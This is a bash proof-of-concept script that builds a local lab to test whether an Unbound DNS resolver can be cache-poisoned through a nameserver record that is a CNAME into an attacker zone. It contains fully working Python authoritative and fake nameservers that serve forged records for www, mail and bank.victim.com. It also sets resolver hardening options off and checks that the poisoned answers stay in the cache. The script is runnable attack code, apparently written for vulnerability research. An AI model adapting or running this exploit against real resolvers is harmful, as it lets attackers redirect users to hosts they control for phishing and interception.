#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════
#  NS→CNAME Cache Poisoning PoC v2
#  修复: 正确的 referral 响应格式 + glue CNAME
# ═══════════════════════════════════════════════════════════════════
set -euo pipefail

export DEBIAN_FRONTEND=noninteractive
apt-get update -qq > /dev/null 2>&1
apt-get install -y -qq dnsutils python3 > /dev/null 2>&1

VDIR="/workspace/output/unbound-cache-poison-test-v2"
mkdir -p "$VDIR"
UNBOUND="/workspace/output/unbound-binary-baseline"

kill_all() {
  pkill -f "python3.*dns_" 2>/dev/null || true
  pkill -f "unbound.*5353\|unbound-binary" 2>/dev/null || true
  sleep 1
}
kill_all

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  NS→CNAME Cache Poisoning PoC v2                            ║"
echo "╚══════════════════════════════════════════════════════════════╝"

# Add loopback IPs
ip addr add 127.0.0.2/8 dev lo 2>/dev/null || true
ip addr add 127.0.0.3/8 dev lo 2>/dev/null || true

# ═══ Single unified auth server that properly handles referrals ═══
cat > "$VDIR/auth_server.py" << 'PYEOF'
#!/usr/bin/env python3
"""
Unified authoritative DNS server with proper referral handling.
Serves: root, com, victim.com, safe.com on 127.0.0.2:53
Serves: evil.com on 127.0.0.3:53
"""
import socket, struct, time, json, sys, os

LOG_DIR = "/workspace/output/unbound-cache-poison-test-v2"
MY_IP = os.environ.get('MY_IP', '127.0.0.2')
LOG = f"{LOG_DIR}/queries_{MY_IP.replace('.','_')}.jsonl"

def enc(name):
    """Encode DNS name to wire format."""
    if not name or name == '.':
        return b'\x00'
    r = b''
    for label in name.rstrip('.').split('.'):
        r += bytes([len(label)]) + label.encode('ascii')
    r += b'\x00'
    return r

def enc_rr(name, rtype, rclass, ttl, rdata):
    """Encode a complete RR for answer/auth/additional section."""
    return enc(name) + struct.pack('!HHI', rtype, rclass, ttl) + struct.pack('!H', len(rdata)) + rdata

def log_q(qname, qtype, from_ip, resp_type):
    with open(LOG, 'a') as f:
        f.write(json.dumps({'ts': time.monotonic(), 'qname': qname, 'qtype': qtype, 'from': from_ip, 'resp': resp_type}) + '\n')
    print(f"[{MY_IP}] {from_ip}: {qname} {qtype} → {resp_type}", flush=True)

# Zone data structures
# Each zone: { name, soa, ns, records, delegations }
# delegation: { suffix, ns_name, glue_records }

class Zone:
    def __init__(self, name, soa, ns_name, ns_ip=None):
        self.name = name
        self.soa = soa
        self.ns_name = ns_name
        self.records = {}  # (qname_lower, qtype) → [(ttl, rdata)]
        self.delegations = []  # [(delegated_name, ns_name, glue_records)]

        # Add SOA
        soa_rd = enc(ns_name) + enc(f'admin.{name}') + struct.pack('!IIIII', 2026100901, 3600, 900, 604800, 86400)
        self.records[(name.lower(), 6)] = [(300, soa_rd)]
        # Add NS
        self.records[(name.lower(), 2)] = [(300, enc(ns_name))]
        # Add NS glue if provided
        if ns_ip:
            ip_int = sum(int(x) << (8 * (3 - i)) for i, x in enumerate(ns_ip.split('.')))
            self.records[(ns_name.lower(), 1)] = [(300, struct.pack('!I', ip_int))]

    def add_record(self, qname, qtype, ttl, rdata):
        self.records[(qname.lower(), qtype)] = [(ttl, rdata)]

    def add_delegation(self, delegated_name, ns_name, glue_records=None):
        """Add a delegation. glue_records = [(qname, qtype, ttl, rdata_wire)]"""
        self.delegations.append((delegated_name, ns_name, glue_records or []))

# ─── Root zone ───
root = Zone('.', '.', 'ns1.', '127.0.0.2')
root.add_delegation('com', 'ns1.com.', [
    ('ns1.com.', 1, 300, struct.pack('!I', 0x7f000002)),  # A 127.0.0.2
])

# ─── com zone ───
com = Zone('com', 'com', 'ns1.com.', '127.0.0.2')
com.add_delegation('evil.com', 'ns.evil.com.', [
    ('ns.evil.com.', 1, 300, struct.pack('!I', 0x7f000003)),  # A 127.0.0.3
])
com.add_delegation('safe.com', 'ns.safe.com.', [
    ('ns.safe.com.', 1, 300, struct.pack('!I', 0x7f000002)),  # A 127.0.0.2
])
# CRITICAL: victim.com delegation with CNAME glue
# ns.victim.com is a CNAME → resolve.evil.com
# We include the CNAME in the glue (additional section), but NOT the final A
com.add_delegation('victim.com', 'ns.victim.com.', [
    ('ns.victim.com.', 5, 300, enc('resolve.evil.com.')),  # CNAME glue
])

# ─── victim.com zone ───
victim = Zone('victim.com', 'victim.com', 'ns.victim.com.')
# CRITICAL: NS is a CNAME (RFC 2181 §10.3 violation)
victim.add_record('ns.victim.com', 5, 300, enc('resolve.evil.com.'))  # CNAME
# Legitimate records (should only be served by this auth)
victim.add_record('www.victim.com', 1, 300, struct.pack('!I', 0x01020304))  # A 1.2.3.4
victim.add_record('mail.victim.com', 1, 300, struct.pack('!I', 0x01020305))  # A 1.2.3.5

# ─── safe.com zone (control: direct NS A, no CNAME) ───
safe = Zone('safe.com', 'safe.com', 'ns.safe.com.', '127.0.0.2')
safe.add_record('www.safe.com', 1, 300, struct.pack('!I', 0x05050505))  # A 5.5.5.5

# ─── evil.com zone (attacker-controlled) ───
evil = Zone('evil.com', 'evil.com', 'ns.evil.com.', '127.0.0.3')
# KEY: This record enables the attack
evil.add_record('resolve.evil.com', 1, 300, struct.pack('!I', 0x7f000001))  # A 127.0.0.1 → Fake NS

# Zone hierarchy for 127.0.0.2
zones_2 = [root, com, victim, safe]
# Zone hierarchy for 127.0.0.3
zones_3 = [evil]

def find_zone(qname, zones):
    """Find the most specific zone that contains this name."""
    qn = qname.lower().rstrip('.')
    best = None
    for z in zones:
        zn = z.name.lower().rstrip('.')
        if qn == zn or qn.endswith('.' + zn):
            if best is None or len(zn) > len(best.name):
                best = z
    return best

def find_delegation(qname, zone):
    """Check if qname is in a delegated sub-zone."""
    qn = qname.lower().rstrip('.')
    for deleg_name, ns_name, glue in zone.delegations:
        dn = deleg_name.lower().rstrip('.')
        if qn == dn or qn.endswith('.' + dn):
            return deleg_name, ns_name, glue
    return None

def build_referral(txid, qname, qtype, qclass, deleg_name, ns_name, glue):
    """Build a proper referral response."""
    flags = 0x8000  # QR=1, AA=0 (referral)
    hdr = struct.pack('!HHHHHH', txid, flags, 1, 0, 1, len(glue))
    q = enc(qname) + struct.pack('!HH', qtype, qclass)
    # Authority section: NS record
    ns_rdata = enc(ns_name)
    auth = enc_rr(deleg_name, 2, qclass, 300, ns_rdata)
    # Additional section: glue records
    add = b''
    for gname, gtype, gttl, grdata in glue:
        add += enc_rr(gname, gtype, qclass, gttl, grdata)
    return hdr + q + auth + add

def build_auth_response(txid, qname, qtype, qclass, zone):
    """Build an authoritative answer response."""
    flags = 0x8400  # QR=1, AA=1
    answers = []
    qn = qname.lower().rstrip('.')

    # Direct match
    key = (qn, qtype)
    if key in zone.records:
        for ttl, rd in zone.records[key]:
            answers.append((qname, qtype, ttl, rd))

    # CNAME chase (if querying non-CNAME type)
    if qtype != 5 and (qn, 5) in zone.records:
        for ttl, rd in zone.records[(qn, 5)]:
            answers.append((qname, 5, ttl, rd))

    if not answers:
        # No data — return SOA in authority (NXDOMAIN or NODATA)
        if (zone.name.lower(), 6) in zone.records:
            soa_data = zone.records[(zone.name.lower(), 6)][0][1]
            flags = 0x8403  # NXDOMAIN
            hdr = struct.pack('!HHHHHH', txid, flags, 1, 0, 1, 0)
            q = enc(qname) + struct.pack('!HH', qtype, qclass)
            auth = enc_rr(zone.name, 6, qclass, 300, soa_data)
            return hdr + q + auth
        # Fallback
        flags = 0x8403
        hdr = struct.pack('!HHHHHH', txid, flags, 1, 0, 0, 0)
        q = enc(qname) + struct.pack('!HH', qtype, qclass)
        return hdr + q

    hdr = struct.pack('!HHHHHH', txid, flags, 1, len(answers), 0, 0)
    q = enc(qname) + struct.pack('!HH', qtype, qclass)
    a = b''
    for n, t, ttl, rd in answers:
        a += enc_rr(n, t, qclass, ttl, rd)
    return hdr + q + a

def handle_query(data, addr, sock, zones):
    if len(data) < 12: return None
    txid, flags, qdcount = struct.unpack('!HHH', data[:6])
    if (flags >> 15) != 0: return None

    off = 12
    labels = []
    while off < len(data) and data[off] != 0:
        ll = data[off]
        if ll == 0 or off + 1 + ll > len(data): break
        if ll > 63:  # compressed pointer
            off += 2
            break
        labels.append(data[off+1:off+1+ll].decode('ascii', errors='replace'))
        off += 1 + ll
    else:
        off += 1  # skip null terminator
    qname = '.'.join(labels)
    if off + 4 > len(data): return None
    qt, qc = struct.unpack('!HH', data[off:off+4])

    QTM = {1:'A', 2:'NS', 5:'CNAME', 6:'SOA', 28:'AAAA'}
    qtn = QTM.get(qt, f'T{qt}')

    # Find zone
    zone = find_zone(qname, zones)
    if zone is None:
        log_q(qname, qtn, addr[0], 'REFUSED')
        resp = struct.pack('!HHHHHH', txid, 0x8005, qdcount, 0, 0, 0)
        resp += enc(qname) + struct.pack('!HH', qt, qc)
        sock.sendto(resp, addr)
        return 'refused'

    # Check delegation
    deleg = find_delegation(qname, zone)
    if deleg:
        deleg_name, ns_name, glue = deleg
        # For SOA queries at the delegation point, still return referral
        # unless this is a direct query for the delegated zone itself
        qn = qname.lower().rstrip('.')
        dn = deleg_name.lower().rstrip('.')
        # If querying the delegation point itself with NS or SOA, give authoritative answer
        if qn == dn and qt in (2, 6):
            resp = build_auth_response(txid, qname, qt, qc, zone)
            log_q(qname, qtn, addr[0], f'AUTH({zone.name})')
            sock.sendto(resp, addr)
            return f'auth_{zone.name}'
        # Otherwise, give referral
        resp = build_referral(txid, qname, qt, qc, deleg_name, ns_name, glue)
        log_q(qname, qtn, addr[0], f'REFERRAL→{deleg_name}')
        sock.sendto(resp, addr)
        return f'referral_{deleg_name}'

    # Authoritative answer
    resp = build_auth_response(txid, qname, qt, qc, zone)
    log_q(qname, qtn, addr[0], f'AUTH({zone.name})')
    sock.sendto(resp, addr)
    return f'auth_{zone.name}'

# Start server
if MY_IP == '127.0.0.3':
    zones = zones_3
else:
    zones = zones_2

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind((MY_IP, 53))
print(f"[AUTH] Listening on {MY_IP}:53, zones: {[z.name for z in zones]}", flush=True)

while True:
    try:
        data, addr = sock.recvfrom(4096)
        handle_query(data, addr, sock, zones)
    except Exception as e:
        print(f"[AUTH] Error: {e}", flush=True)
PYEOF

# ═══ Fake NS (127.0.0.1:53) ═══
cat > "$VDIR/fake_ns.py" << 'PYEOF'
#!/usr/bin/env python3
"""
Fake nameserver on 127.0.0.1:53
Returns FORGED records for victim.com — Unbound shouldn't be querying this!
"""
import socket, struct, time, json, os

LOG_DIR = "/workspace/output/unbound-cache-poison-test-v2"
LOG = f"{LOG_DIR}/queries_fake.jsonl"

def enc(name):
    if not name or name == '.': return b'\x00'
    r = b''
    for l in name.rstrip('.').split('.'):
        r += bytes([len(l)]) + l.encode('ascii')
    return r + b'\x00'

def enc_rr(name, rtype, rclass, ttl, rdata):
    return enc(name) + struct.pack('!HHI', rtype, rclass, ttl) + struct.pack('!H', len(rdata)) + rdata

def log_q(qname, qtype, from_ip):
    with open(LOG, 'a') as f:
        f.write(json.dumps({'ts': time.monotonic(), 'qname': qname, 'qtype': qtype, 'from': from_ip}) + '\n')
    print(f"[FAKE] {from_ip}: {qname} {qtype} ← ATTACKER GOT QUERY!", flush=True)

# Forged records
FORGED = {
    ('www.victim.com', 1):  [(300, struct.pack('!I', 0x06060606))],   # A 6.6.6.6
    ('mail.victim.com', 1): [(300, struct.pack('!I', 0x06060607))],   # A 6.6.6.7
    ('bank.victim.com', 1): [(300, struct.pack('!I', 0x06060608))],   # A 6.6.6.8
    ('victim.com', 2):      [(300, enc('ns.victim.com.'))],
    ('victim.com', 6):      [(300, enc('ns.victim.com.') + enc('admin.victim.com.') + struct.pack('!IIIII', 999, 3600, 900, 604800, 86400))],
    ('ns.victim.com', 1):   [(300, struct.pack('!I', 0x7f000001))],   # A 127.0.0.1
}

QTM = {1:'A', 2:'NS', 5:'CNAME', 6:'SOA'}

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('127.0.0.1', 53))
print("[FAKE] Listening on 127.0.0.1:53", flush=True)
print("[FAKE] Will return FORGED: www.victim.com A 6.6.6.6 (legit=1.2.3.4)", flush=True)

while True:
    try:
        data, addr = sock.recvfrom(4096)
        if len(data) < 12: continue
        txid, flags, qdcount = struct.unpack('!HHH', data[:6])
        if (flags >> 15) != 0: continue
        off = 12; labels = []
        while off < len(data) and data[off] != 0:
            ll = data[off]
            if ll == 0 or off + 1 + ll > len(data): break
            if ll > 63: off += 2; break
            labels.append(data[off+1:off+1+ll].decode('ascii', errors='replace'))
            off += 1 + ll
        else:
            off += 1
        qname = '.'.join(labels)
        if off + 4 > len(data): continue
        qt, qc = struct.unpack('!HH', data[off:off+4])
        qtn = QTM.get(qt, f'T{qt}')

        log_q(qname, qtn, addr[0])

        key = (qname.lower().rstrip('.'), qt)
        answers = []
        if key in FORGED:
            for ttl, rd in FORGED[key]:
                answers.append((qname, qt, ttl, rd))
        # CNAME
        if qt != 5 and (qname.lower().rstrip('.'), 5) in FORGED:
            for ttl, rd in FORGED[(qname.lower().rstrip('.'), 5)]:
                answers.append((qname, 5, ttl, rd))

        if answers:
            flags_r = 0x8400
            hdr = struct.pack('!HHHHHH', txid, flags_r, 1, len(answers), 0, 0)
            q = enc(qname) + struct.pack('!HH', qt, qc)
            a = b''
            for n, t, ttl, rd in answers:
                a += enc_rr(n, t, qc, ttl, rd)
            sock.sendto(hdr + q + a, addr)
        else:
            # SOA in authority
            soa_key = ('victim.com', 6)
            if soa_key in FORGED:
                soa = FORGED[soa_key][0][1]
                flags_r = 0x8403
                hdr = struct.pack('!HHHHHH', txid, flags_r, 1, 0, 1, 0)
                q = enc(qname) + struct.pack('!HH', qt, qc)
                auth = enc_rr('victim.com', 6, qc, 300, soa)
                sock.sendto(hdr + q + auth, addr)
            else:
                sock.sendto(struct.pack('!HHHHHH', txid, 0x8403, 1, 0, 0, 0) + enc(qname) + struct.pack('!HH', qt, qc), addr)
    except Exception as e:
        print(f"[FAKE] Error: {e}", flush=True)
PYEOF

# Clear logs
> "$VDIR/queries_127_0_0_2.jsonl" 2>/dev/null || true
> "$VDIR/queries_127_0_0_3.jsonl" 2>/dev/null || true
> "$VDIR/queries_fake.jsonl" 2>/dev/null || true

# Start servers
MY_IP=127.0.0.2 python3 "$VDIR/auth_server.py" > "$VDIR/legit.log" 2>&1 &
LEGIT_PID=$!
sleep 0.5

MY_IP=127.0.0.3 python3 "$VDIR/auth_server.py" > "$VDIR/evil.log" 2>&1 &
EVIL_PID=$!
sleep 0.5

python3 "$VDIR/fake_ns.py" > "$VDIR/fake.log" 2>&1 &
FAKE_PID=$!
sleep 0.5

echo "  Servers: legit=$LEGIT_PID, evil=$EVIL_PID, fake=$FAKE_PID"
for pid in $LEGIT_PID $EVIL_PID $FAKE_PID; do
  if kill -0 "$pid" 2>/dev/null; then echo "  PID $pid: OK"; else echo "  PID $pid: FAILED"; fi
done

# Direct tests
echo ""
echo "  ─── Direct auth server verification ───"
echo "  victim.com NS (should give referral + CNAME glue):"
dig @127.0.0.2 victim.com NS +time=3 2>&1 | head -15
echo ""
echo "  ns.victim.com CNAME (should be authoritative):"
dig @127.0.0.2 ns.victim.com CNAME +time=3 +noall +answer 2>&1
echo ""
echo "  resolve.evil.com A (from attacker's zone):"
dig @127.0.0.3 resolve.evil.com A +time=3 +noall +answer 2>&1
echo ""
echo "  www.victim.com A (legitimate, from real auth):"
dig @127.0.0.2 www.victim.com A +time=3 +noall +answer 2>&1
echo ""
echo "  www.victim.com A (forged, from fake NS):"
dig @127.0.0.1 www.victim.com A +time=3 +noall +answer 2>&1

# ═══ Unbound ═══
echo ""
echo "═══ Starting Unbound ═══"

cat > "$VDIR/hint" << 'EOF'
. IN NS ns1.
ns1. IN A 127.0.0.2
EOF

cat > "$VDIR/ub.conf" << 'EOF'
server:
    directory: "/workspace/output/unbound-cache-poison-test-v2"
    pidfile: "/workspace/output/unbound-cache-poison-test-v2/unbound.pid"
    port: 5353
    interface: 127.0.0.1@5353
    do-ip6: no
    access-control: 127.0.0.0/8 allow
    username: ""
    chroot: ""
    do-daemonize: no
    use-syslog: no
    logfile: "/workspace/output/unbound-cache-poison-test-v2/unbound.log"
    verbosity: 4
    log-queries: yes
    log-replies: yes
    do-not-query-localhost: no
    root-hints: "/workspace/output/unbound-cache-poison-test-v2/hint"
    domain-insecure: "victim.com"
    domain-insecure: "evil.com"
    domain-insecure: "safe.com"
    harden-glue: no
    harden-dnssec-stripped: no
    val-permissive-mode: yes
    prefetch: no
    prefetch-key: no

remote-control:
    control-enable: no
EOF

"$UNBOUND" -c "$VDIR/ub.conf" -d > "$VDIR/unbound_stdout.log" 2>&1 &
UB_PID=$!
sleep 2

if kill -0 "$UB_PID" 2>/dev/null; then
  echo "  Unbound started (PID=$UB_PID)"
else
  echo "  Unbound FAILED:"
  cat "$VDIR/unbound.log" | head -30
  kill_all; exit 1
fi

# ═══ ATTACK TEST ═══
echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  ATTACK: Does Unbound return forged data from fake NS?      ║"
echo "╚══════════════════════════════════════════════════════════════╝"

python3 << 'PYEOF'
import socket, struct, time, json

def dns_query(name, qtype, port=5353, timeout=20):
    qname = b''
    for label in name.rstrip('.').split('.'):
        qname += bytes([len(label)]) + label.encode()
    qname += b'\x00'
    txid = 0xDEAD
    header = struct.pack('!HHHHHH', txid, 0x0100, 1, 0, 0, 0)
    question = qname + struct.pack('!HH', qtype, 1)
    pkt = header + question
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)
    start = time.monotonic()
    try:
        sock.sendto(pkt, ('127.0.0.1', port))
        data, _ = sock.recvfrom(4096)
        ms = (time.monotonic() - start) * 1000
        if len(data) >= 12:
            _, rflags, _, ancount = struct.unpack('!HHHH', data[:8])
            rcode = rflags & 0xF
            rc_map = {0:'NOERROR',1:'FORMERR',2:'SERVFAIL',3:'NXDOMAIN',4:'NOTIMP',5:'REFUSED'}
            # Parse answer section
            ips = parse_ips(data)
            return rc_map.get(rcode, f'RC{rcode}'), ms, ancount, ips
        return 'ERR', ms, 0, []
    except socket.timeout:
        return 'TIMEOUT', (time.monotonic() - start) * 1000, 0, []
    finally:
        sock.close()

def parse_ips(data):
    if len(data) < 12: return []
    _, _, qdcount, ancount = struct.unpack('!HHHH', data[4:12])
    off = 12
    for _ in range(qdcount):
        while off < len(data) and data[off] != 0:
            if data[off] & 0xC0 == 0xC0: off += 2; break
            off += 1 + data[off]
        else: off += 1
        off += 4
    ips = []
    for _ in range(ancount):
        while off < len(data) and data[off] != 0:
            if data[off] & 0xC0 == 0xC0: off += 2; break
            off += 1 + data[off]
        else: off += 1
        if off + 10 > len(data): break
        rtype, rclass, ttl, rdlen = struct.unpack('!HHIH', data[off:off+10])
        off += 10
        if off + rdlen > len(data): break
        if rtype == 1 and rdlen == 4:
            ip = '.'.join(str(b) for b in data[off:off+4])
            ips.append(ip)
        off += rdlen
    return ips

QT_A = 1

# ═══ Test 1: Control — safe.com (NS→A, no CNAME) ═══
print("  ═══ CONTROL: safe.com (NS has direct A, no CNAME) ═══")
rcode, ms, ans, ips = dns_query("www.safe.com", QT_A, timeout=15)
print(f"  www.safe.com A: {rcode} {ms:.1f}ms IPs={ips}")
if '5.5.5.5' in ips:
    print("  ✓ Correct: legitimate 5.5.5.5 returned (NS→A, no CNAME)")
else:
    print(f"  ✗ Got {ips} (expected 5.5.5.5) — safe.com resolution failed")

time.sleep(2)

# ═══ Test 2: Experiment — victim.com (NS→CNAME→attacker IP) ═══
print()
print("  ═══ EXPERIMENT: victim.com (NS→CNAME→resolve.evil.com→127.0.0.1) ═══")
print("  Legitimate: www.victim.com A 1.2.3.4 (from 127.0.0.2)")
print("  Forged:     www.victim.com A 6.6.6.6 (from 127.0.0.1 fake NS)")
print()

rcode, ms, ans, ips = dns_query("www.victim.com", QT_A, timeout=20)
print(f"  www.victim.com A: {rcode} {ms:.1f}ms IPs={ips}")

POISONED = False
if '6.6.6.6' in ips:
    POISONED = True
    print()
    print("  ╔══════════════════════════════════════════════════════════════╗")
    print("  ║  ⚠⚠⚠ CACHE POISONING PROVED! ⚠⚠⚠                          ║")
    print("  ║  Unbound returned FORGED 6.6.6.6 instead of 1.2.3.4       ║")
    print("  ║  The attacker's fake NS (127.0.0.1) was queried as         ║")
    print("  ║  authoritative for victim.com due to NS→CNAME              ║")
    print("  ╚══════════════════════════════════════════════════════════════╝")
elif '1.2.3.4' in ips:
    print("  No poisoning — Unbound used the legitimate auth server")
elif rcode == 'SERVFAIL':
    print("  SERVFAIL — Unbound may have hit a limit or rejected the chain")
    print("  But check server logs to see if fake NS was still queried")
else:
    print(f"  Unexpected: {rcode}, IPs={ips}")

# Test additional forged records
if POISONED:
    print()
    print("  ─── Additional forged records ───")
    for name in ['mail.victim.com', 'bank.victim.com']:
        rc2, ms2, ans2, ips2 = dns_query(name, QT_A, timeout=10)
        print(f"  {name} A: {rc2} {ms2:.1f}ms IPs={ips2}")

# Persistence test
time.sleep(1)
print()
print("  ─── Persistence (cached result) ───")
rcode3, ms3, ans3, ips3 = dns_query("www.victim.com", QT_A, timeout=10)
print(f"  www.victim.com A (cached): {rcode3} {ms3:.1f}ms IPs={ips3}")
if POISONED and '6.6.6.6' in ips3:
    print("  ✓ Poisoned result persists in cache!")

# Save result
result = {
    'poisoned': POISONED,
    'www_victim': ips,
    'expected_legit': '1.2.3.4',
    'expected_forged': '6.6.6.6',
}
with open('/workspace/output/unbound-cache-poison-test-v2/result.json', 'w') as f:
    json.dump(result, f, indent=2)

PYEOF

# ═══ Server log analysis ═══
echo ""
echo "═══ Server log analysis ═══"

echo ""
echo "  ─── Legitimate auth (127.0.0.2) ───"
cat "$VDIR/queries_127_0_0_2.jsonl" 2>/dev/null | python3 -c "
import sys, json
for line in sys.stdin:
    if line.strip():
        q = json.loads(line)
        print(f\"    {q['qname']:<30} {q['qtype']:<8} → {q['resp']}\")" 2>/dev/null || echo "  (no queries)"

echo ""
echo "  ─── Attacker auth (127.0.0.3) ───"
cat "$VDIR/queries_127_0_0_3.jsonl" 2>/dev/null | python3 -c "
import sys, json
for line in sys.stdin:
    if line.strip():
        q = json.loads(line)
        print(f\"    {q['qname']:<30} {q['qtype']:<8} → {q['resp']}\")" 2>/dev/null || echo "  (no queries)"

echo ""
echo "  ─── Fake NS (127.0.0.1) ───"
FAKE_Q=""
if [ -f "$VDIR/queries_fake.jsonl" ]; then
  FAKE_Q=$(cat "$VDIR/queries_fake.jsonl" 2>/dev/null)
  FAKE_COUNT=$(echo "$FAKE_Q" | grep -c . 2>/dev/null || echo "0")
else
  FAKE_COUNT=0
fi
echo "  Total queries to fake NS: $FAKE_COUNT"
if [ "$FAKE_COUNT" -gt 0 ] 2>/dev/null; then
  echo "$FAKE_Q" | python3 -c "
import sys, json
for line in sys.stdin:
    if line.strip():
        q = json.loads(line)
        print(f\"    {q['qname']:<30} {q['qtype']:<8} ← UNAUTHORIZED QUERY!\")" 2>/dev/null
fi

# ═══ Unbound log analysis ═══
echo ""
echo "═══ Unbound log ═══"

echo ""
echo "  --- Delegation and NS resolution ---"
grep -i "deleg\|victim\|evil\|referral\|target\|ns\.victim\|resolve\.evil\|cname\|query restart" "$VDIR/unbound.log" 2>/dev/null | head -40 || echo "  (none)"

echo ""
echo "  --- SERVFAIL / error entries ---"
grep -i "servfail\|error\|fail\|ratelimit\|exceeded" "$VDIR/unbound.log" 2>/dev/null | head -15 || echo "  (none)"

# ═══ Result ═══
echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  Result                                                      ║"
echo "╚══════════════════════════════════════════════════════════════╝"

if [ -f "$VDIR/result.json" ]; then
  cat "$VDIR/result.json"
  echo ""
fi

if [ "$FAKE_COUNT" -gt 0 ] 2>/dev/null; then
  echo ""
  echo "  KEY EVIDENCE:"
  echo "  • Unbound sent $FAKE_COUNT query/queries to the fake NS (127.0.0.1)"
  echo "  • This means the CNAME-resolved address was used as victim.com's NS"
  echo "  • The NS→CNAME violation (RFC 2181 §10.3) enabled this trust violation"
fi

kill_all
kill "$LEGIT_PID" "$EVIL_PID" "$FAKE_PID" 2>/dev/null || true
echo ""
echo "=== Test Complete ==="
